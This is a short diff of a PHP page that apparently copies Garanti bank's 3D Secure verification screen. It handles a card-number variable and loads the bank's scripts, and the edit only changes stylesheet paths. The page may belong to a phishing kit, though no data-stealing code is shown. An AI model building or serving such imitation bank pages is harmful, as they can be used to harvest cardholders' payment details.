@@ -13,8 +13,8 @@ $cc_first_6 = substr($kart_no, 0, 6);
       <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
       <meta http-equiv="Pragma" content="no-cache">
       <meta http-equiv="Expires" content="0">
-      <link rel="stylesheet" href="./acs-style/garanti/css/fonts.css">
-      <link rel="stylesheet" href="./acs-style/garanti/css/garanti.css">
+      <link rel="stylesheet" href="<?= BASE_PATH ?>/assets/acs-style/garanti/css/fonts.css">
+      <link rel="stylesheet" href="<?= BASE_PATH ?>/assets/acs-style/garanti/css/garanti.css">
       <script type="text/javascript" src="https://gbemv3dsecure.garanti.com.tr/js/jquery-3.3.1.min.js"></script>
       <script type="text/javascript" src="https://gbemv3dsecure.garanti.com.tr/js/functions.js"></script>
       <style>
